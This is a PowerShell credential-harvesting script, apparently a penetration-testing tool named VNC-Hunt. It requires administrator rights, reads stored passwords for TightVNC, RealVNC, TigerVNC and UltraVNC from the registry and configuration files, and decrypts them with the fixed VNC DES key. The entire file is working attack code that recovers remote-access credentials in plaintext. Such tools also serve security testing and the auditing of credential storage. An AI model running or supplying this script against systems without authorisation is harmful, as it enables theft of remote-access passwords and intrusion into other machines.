function VNC-Decrypt {

    <#
    .SYNOPSIS
        Decrypts an encrypted VNC password using the DES algorithm.
    
    .DESCRIPTION
        The `VNC-Decrypt` function decrypts an encrypted VNC password provided in hexadecimal format. It converts the encrypted password from hex to bytes, applies DES decryption using a fixed key, and returns the decrypted password.
    
    .PARAMETER Password
        The encrypted VNC password in hexadecimal format.
    
    .EXAMPLE
        VNC-Decrypt -Password FACBCF50C3BF1C088A
    #>
    
    param (
        [Parameter(Mandatory = $true)]
        [string]$Password
    )
    
    # Convert the encrypted password from hex to bytes
    $encryptedBytes = [byte[]]::new($Password.Length / 2)
    for ($i = 0; $i -lt $Password.Length; $i += 2) {
        $encryptedBytes[$i / 2] = [Convert]::ToByte($Password.Substring($i, 2), 16)
    }
    
    # Fixed DES key and initialization vector (IV)
    $desKey = [byte[]](0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0)
    
    $des = [System.Security.Cryptography.DES]::Create()
    $des.Key = $desKey
    $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $des.Padding = [System.Security.Cryptography.PaddingMode]::None
    
    # Ensure the encryptedBytes array length is a multiple of the block size (8 bytes)
    if ($encryptedBytes.Length % 8 -ne 0) {
        $paddedLength = [Math]::Ceiling($encryptedBytes.Length / 8) * 8
        $paddedBytes = [byte[]]::new($paddedLength)
        [Array]::Copy($encryptedBytes, $paddedBytes, $encryptedBytes.Length)
        $encryptedBytes = $paddedBytes
    }
    
    # Decrypt the encrypted bytes
    $decryptor = $des.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    $decryptedPassword = ([System.Text.Encoding]::ASCII.GetString($decryptedBytes)).Trim([char]0)
    $decryptedPassword = $decryptedPassword.Substring(0, [Math]::Min($decryptedPassword.Length, 8))
    
    return $decryptedPassword
}
    
function GetRegistryValue {
    param (
        [string]$Path,
        [string]$Key
    )
    
    try {
        $regKey = Get-ItemProperty -Path "HKLM:\$Path" -Name $Key -ErrorAction Stop
        $value = $regKey.$Key
    
        if ($value -is [byte[]]) {
            # Convert REG_BINARY to a hexadecimal string
            return [BitConverter]::ToString($value).Replace("-", "")
        }
        else {
            # Return REG_SZ or other types as is
            return $value
        }
    }
    catch {
        return $null
    }
}
    
# TightVNC
    
function Search-TightVNC-Passwords {
    $TightVNCServerPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "Password"
    $TightVNCServerControlPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "ControlPassword"
    $TightVNCServerPasswordViewOnly = GetRegistryValue -Path "Software\TightVNC\Server" -Key "PasswordViewOnly"
    
    if ($TightVNCServerPassword -ne $null -or $TightVNCServerControlPassword -ne $Null -or $TightVNCServerPasswordViewOnly -ne $null) {
    
        try { $TightVNCServerPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerPassword ; $T1 = $true } Catch { $T1 = $false }
        try { $TightVNCServerControlPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerControlPassword ; $T2 = $true } Catch { $T2 = $false }
        try { $TightVNCServerPasswordViewOnlyPlaintext = VNC-Decrypt -Password $TightVNCServerPasswordViewOnly ; $T3 = $true } Catch { $T3 = $false }
    
        if ($T1 -or $T2 -or $T3) { Write-Host "[+] " -ForegroundColor "Green" -NoNewline ; Write-Host "TightVNC" ; Write-Host }
    
        if ($T1) {
            Write-Host "Encrypted Password : $TightVNCServerPassword"
            Write-Host "Decrypted Password : $TightVNCServerPasswordPlaintext"
        }
    
        if ($T2) {
            Write-Host
            Write-Host "Encrypted Password : $TightVNCServerControlPassword"
            Write-Host "Decrypted Password : $TightVNCServerControlPasswordPlaintext"
        }
    
        if ($T3) {
            Write-Host
            Write-Host "Encrypted Password : $TightVNCServerPasswordViewOnly"
            Write-Host "Decrypted Password : $TightVNCServerPasswordViewOnlyPlaintext"
        }
    
        Write-Host
        Write-Host
    }
    
    
    
}
    
    
Function Search-RealVNC-Passwords {
    # RealVNC
    $RealVNCProxyUser = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyUsername"
    $RealVNCProxyServer = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyServer"
    $RealVNCPassword = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyPassword"
    
    if ($RealVNCPassword) {
        $RealVNCPlaintext = VNC-Decrypt -Password $RealVNCPassword
        Write-Host "[+] " -ForegroundColor "Green" -NoNewline ; Write-Host "RealVNC" ; Write-Host
        Write-Host "Proxy Server   : $RealVNCProxyServer"
        Write-Host "Proxy Username : $RealVNCProxyUser"
        Write-Host "Proxy Password : $RealVNCPlaintext"
        Write-Host
        Write-Host
    } 
    
}
    
Function Search-TigerVNC-Passwords {
    $TigerVNCPPassword = GetRegistryValue -Path "SOFTWARE\TigerVNC\WinVNC4" -Key "Password"
    if ($TigerVNCPPassword) {
        
        $TigerVNCPPasswordPlaintext = VNC-Decrypt -Password $TigerVNCPPassword
        Write-Host "[+] " -ForegroundColor "Green" -NoNewline ; Write-Host "TigerVNC" ; Write-Host
        Write-Host "Encrypted Password : $TigerVNCPPassword"
        Write-Host "Decrypted Password : $TigerVNCPPasswordPlaintext"
        Write-Host
        Write-Host
    }
    
    
}
    
    
# UltraVNC
function Search-UltraVNC-Passwords {
    param (
        [string[]]$Paths
    )
    
    [int]$Counter = 0
    $regexPatterns = @("passwd=[0-9A-F]+", "passwd2=[0-9A-F]+")
    foreach ($path in $Paths) {
        if (Test-Path $path) {
            $fileContent = Get-Content -Path $path -Raw
            foreach ($pattern in $regexPatterns) {
                $matches = [regex]::Matches($fileContent, $pattern)
                foreach ($match in $matches) {
                    $encryptedPassword = $match.Value.Split('=')[-1]
                    try {
                        $decryptedPassword = VNC-Decrypt -Password $encryptedPassword
                            
                        if ($Counter -lt 1) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline ; Write-Host "UltraVNC" ; $Counter ++
                            
                        }
                        if ($Counter -gt 0) { Write-Host }
                        Write-Host "Encrypted Password : $encryptedPassword"
                        Write-Host "Decrypted Password : $decryptedPassword"
                    }
                    catch {
                        Write-Host "Failed to decrypt password: $encryptedPassword"
                    }
                }
            }
        }
    }
        
    Write-Host
}
    
# Define UltraVNC paths to search
$UltraVNCPaths = @(
    "$env:SystemDrive\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files\uvnc bvba\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files (x86)\UltraVNC\ultravnc.ini"
)
    
Function VNC-Hunt {
    
    <#
    
    .SYNOPSIS
        Hunt-VNC | Author: ViperOne
         https://github.com/The-Viper-One
    
        Searches for and decrypts VNC passwords stored in the registry and configuration files.
    
    .DESCRIPTION
        This PowerShell script searches for VNC passwords stored in the registry and configuration files for various VNC implementations, including RealVNC, TightVNC, TigerVNC, and UltraVNC.
        The script identifies and decrypts these passwords using the DES algorithm with a fixed key. It covers the following VNC implementations:
        - RealVNC: Searches the registry for VNC server proxy credentials.
        - TightVNC: Searches the registry for server passwords, control passwords, and view-only passwords.
        - TigerVNC: Searches the registry for server passwords.
        - UltraVNC: Searches for passwords in configuration files located in specified directories.
    
    .PARAMETER None
    
    .EXAMPLE
        VNC-Hunt
    #>
    
    Write-Host
    Write-Host

    function CheckAdmin {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    if (CheckAdmin) {} 
    else {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Script requires local administrator"
        break
    }

    
    Search-RealVNC-Passwords
    Search-TightVNC-Passwords
    Search-TigerVNC-Passwords
    Search-UltraVNC-Passwords -Paths $UltraVNCPaths
    
}
    
